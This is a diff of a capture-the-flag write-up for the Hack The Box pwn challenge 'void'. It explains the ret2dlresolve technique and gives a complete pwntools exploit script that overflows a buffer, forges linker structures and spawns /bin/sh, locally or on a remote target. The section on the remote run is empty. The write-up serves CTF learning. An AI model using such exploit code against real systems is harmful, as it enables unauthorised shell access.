@@ -24,4 +24,66 @@ The room goes dark and all you can see is a damaged terminal. Hack into it to re
 5. But after checking the **Global Offset Table** turns out there are no `puts()`, `printf()`, or `write()` functions.
 6. Then i realized it's a `ret2dlresolve` pwn challenge. It's a technique in pwn to manipulate the dyanmic linker's resolution process and redirect it to execute arbitrary code.
 7. Actually it's `quite similiar` to overwrite GOT with format strings vuln.
-8. Also we can utilize **pwntools** to automate the process to resolve the functions, because if we don't use pwntools, we need to construct.
+8. Also we can utilize **pwntools** to automate the process to resolve the functions, because if we don't use pwntools, we need to construct 3 structures to fake.
+
+```console
+There're 3 structures we need to fake:
+- STRTAB
+- SYMTAB
+- JMPREL
+```
+
+9. Here's the script i used to solve this:
+
+```py
+from pwn import *
+import os 
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe], *a, **kw)
+
+exe = './void'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = start()
+
+padding = 72
+
+rop = ROP(elf)
+
+dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
+rop.raw(asm('nop') * padding)
+rop.read(0, dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+
+sh.sendline(rop.chain())
+sh.sendline(dlresolve.payload)
+
+sh.interactive()
+```
+
+> LOCALLY
+
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/57498dbc-34a6-45b1-aa52-0c1c9568caf8)
+
+
+10. Let's send it remotely.
+
+> REMOTELY
+
+
+
+
+
+
+
+
+
+
+
